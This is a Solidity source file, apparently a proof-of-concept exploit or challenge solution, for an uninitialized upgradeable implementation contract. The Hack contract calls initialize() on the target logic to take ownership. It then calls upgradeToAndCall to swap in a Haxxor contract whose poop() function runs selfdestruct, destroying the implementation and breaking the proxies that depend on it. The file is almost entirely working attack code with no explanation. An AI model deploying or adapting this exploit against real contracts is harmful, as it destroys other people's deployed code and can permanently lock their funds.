// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract Hack {
    address logic;
    bool public result;

    constructor(address _logic) public{
        logic = _logic;
        callinitialize();
    }
    
   
    function  callinitialize() internal {
        (bool success, ) = logic.call(abi.encodeWithSignature('initialize()'));
        require(success, 'initalize call failed');
    }

    function setmaliciousImp() external returns(bool){
        Haxxor haxor = new Haxxor();

        (bool success, ) = logic.call(
         abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(haxor),
            abi.encodeWithSignature('poop()')
         ));
        require(success, "hack call failed");

    }

    function testBrokenLogic() public {
        result = Address.isContract(logic);
    }


}

contract Haxxor {
    function poop() external {
        selfdestruct(msg.sender);
    }
}